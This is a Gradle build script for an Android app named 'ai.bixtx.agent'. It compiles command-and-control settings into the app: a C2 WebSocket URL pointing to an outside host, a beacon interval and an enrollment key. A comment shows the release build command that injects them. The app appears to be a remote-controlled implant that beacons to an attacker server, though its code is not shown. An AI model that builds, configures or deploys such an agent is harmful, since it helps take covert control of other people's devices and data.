import java.util.Properties

plugins {
    alias(libs.plugins.android.application)
    alias(libs.plugins.kotlin.android)
}

// Read signing config from environment or local properties
val keystoreProps = Properties()
val keystoreFile = rootProject.file("keystore.properties")
if (keystoreFile.exists()) keystoreProps.load(keystoreFile.inputStream())

fun prop(key: String, envKey: String = key, default: String = "") =
    (project.findProperty(key) as? String)
        ?: System.getenv(envKey)
        ?: keystoreProps.getProperty(key, default)

android {
    namespace = "ai.bixtx.agent"
    compileSdk = 34

    defaultConfig {
        applicationId = "ai.bixtx.agent"
        minSdk = 21
        targetSdk = 34
        versionCode = 472
        versionName = "4.7.2"

        // C2 config — inject via Gradle property or env var at build time:
        //   ./gradlew assembleRelease -Pc2WsUrl="wss://bixtx.onrender.com/agent" -PbeaconInterval=30
        buildConfigField("String",  "C2_WS_URL",        "\"${prop("c2WsUrl", "C2_WS_URL", "wss://bixtx.onrender.com/agent")}\"")
        buildConfigField("int",     "BEACON_INTERVAL",  prop("beaconInterval", "BEACON_INTERVAL", "30"))
        buildConfigField("String",  "ENROLL_KEY",       "\"${prop("enrollKey", "BIXTX_ENROLL_KEY", "BTX-2026-ALPHA")}\"")
        buildConfigField("String",  "AGENT_VERSION",    "\"4.7.2\"")
    }

    signingConfigs {
        create("release") {
            storeFile   = prop("storeFile", "KEYSTORE_FILE").takeIf { it.isNotEmpty() }?.let { file(it) }
            storePassword = prop("storePassword", "KEYSTORE_PASSWORD")
            keyAlias    = prop("keyAlias", "KEY_ALIAS", "bixtx")
            keyPassword = prop("keyPassword", "KEY_PASSWORD")
        }
    }

    buildTypes {
        release {
            isMinifyEnabled = true
            isShrinkResources = true
            proguardFiles(getDefaultProguardFile("proguard-android-optimize.txt"), "proguard-rules.pro")
            // Use signing config if keystore is provided, otherwise produce unsigned APK
            if (prop("storeFile", "KEYSTORE_FILE").isNotEmpty()) {
                signingConfig = signingConfigs.getByName("release")
            }
        }
        debug {
            applicationIdSuffix = ".debug"
            isDebuggable = true
        }
    }

    buildFeatures {
        buildConfig = true
    }

    compileOptions {
        sourceCompatibility = JavaVersion.VERSION_1_8
        targetCompatibility = JavaVersion.VERSION_1_8
    }
    kotlinOptions {
        jvmTarget = "1.8"
    }
}

dependencies {
    implementation("androidx.appcompat:appcompat:1.6.1")
    implementation(libs.okhttp)
    implementation(libs.okhttp.logging)
    implementation(libs.gson)
    implementation(libs.core.ktx)
}
